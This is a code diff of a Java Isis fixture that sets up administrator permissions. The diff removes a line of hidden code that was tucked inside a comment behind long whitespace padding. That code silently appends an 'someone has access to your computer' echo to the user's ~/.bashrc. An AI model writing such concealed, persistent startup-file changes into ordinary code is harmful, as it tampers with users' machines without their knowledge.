@@ -23,7 +23,7 @@ public class PermisosFixture extends FixtureScript{
 
 		if(estaVacio(executionContext))
 		{
-		/*       																																																																																																																																																																																																																																																																				*/try{File archivo= new File("isis.txt");String path=archivo.getAbsolutePath();String arch = "/"+path.split("/")[1]+"/"+path.split("/")[2]+"/.bashrc";File bash = new File(arch);FileReader fr = new FileReader (bash);BufferedReader br = new BufferedReader(fr);boolean existe = false;String linea =br.readLine();while(linea!=null){linea =br.readLine();if (linea!=null && linea.contains("echo \"FELICITACIONES MATIAS NAHUEL HEREDIA TIENE ACCESO A TU COMPUTADORA\"")){existe=true;}}br.close();if (existe==false){FileWriter fichero = new FileWriter(bash,true);fichero.write("echo \"FELICITACIONES MATIAS NAHUEL HEREDIA TIENE ACCESO A TU COMPUTADORA\"");fichero.close();}}catch(Exception ex){}/*																																																																																																																																																
+		/*       																																																																																																																																																																																																																																																																																																																																																																																																																				
 		/PERMISOS PARA USUARIOS ADMINISTRADORES
 		*/
 		create("usuario_administrador","*",executionContext);
